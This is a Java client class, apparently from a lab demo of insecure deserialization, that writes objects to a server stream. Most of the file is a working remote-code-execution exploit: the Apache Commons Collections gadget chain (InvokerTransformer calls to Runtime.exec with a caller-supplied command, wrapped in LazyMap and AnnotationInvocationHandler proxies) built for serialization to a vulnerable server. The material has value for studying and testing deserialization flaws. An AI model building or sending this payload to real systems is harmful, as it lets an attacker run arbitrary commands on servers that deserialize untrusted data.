package com.example.ywag;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

public class Client {

    private static Logger logger = Logger.getGlobal();
    
    private ObjectOutputStream oos;
    
    public Client(OutputStream out) throws IOException {
        this.oos = new ObjectOutputStream(out);
    }
    
    public void sendHashMap() throws IOException {
        send(createHashMap());
    }
    
    public void sendLazyMap(String cmd) throws IOException {
        send(createLazyMap(cmd));
    }

    public void send(Object data) throws IOException {
        logger.log(Level.INFO, "send object to the server. (data = " + data.getClass().toGenericString() + ")");
        oos.writeObject(data);
    }

    private static Map<String, String> createHashMap() {
        HashMap<String, String> ret = new HashMap<>();
        ret.put("key", "valid value");
        return ret;
    }
    
    private Map<?, ?> createLazyMap(String cmd) {
        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                    "getMethod",
                    new Class[] { String.class, Class[].class },
                    new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer(
                    "invoke",
                    new Class[] { Object.class, Object[].class },
                    new Object[] { null, new Object[0] }),
                new InvokerTransformer(
                    "exec",
                    new Class[] { String.class },
                    new Object[] {cmd}),
                new ConstantTransformer("attacked!")
        };
        Transformer chain = new ChainedTransformer(transformers);
        
        return LazyMap.decorate(new HashMap<String, Object>(), chain);
    }

    public void sendString(String string) throws IOException {
        send(string);
    }

    @SuppressWarnings("rawtypes")
    public void sendAnnotationInvocationHandler(String cmd)
            throws ClassNotFoundException, NoSuchMethodException, SecurityException, IOException, InstantiationException,
                   IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        
        InvocationHandler innerHandler = createAnnotationInvocationHandler(createLazyMap(cmd));
        Map proxy = (Map)Proxy.newProxyInstance(Object.class.getClassLoader(), new Class[] {Map.class}, innerHandler);
        InvocationHandler outerHandler = createAnnotationInvocationHandler(proxy);
        send(outerHandler);
    }

    @SuppressWarnings({ "rawtypes", "unchecked" })
    private InvocationHandler createAnnotationInvocationHandler(Map map)
            throws ClassNotFoundException, NoSuchMethodException, SecurityException, InstantiationException,
                   IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object ret = constructor.newInstance(Override.class, map);
        
        return (InvocationHandler)ret;
    }
    
    
}

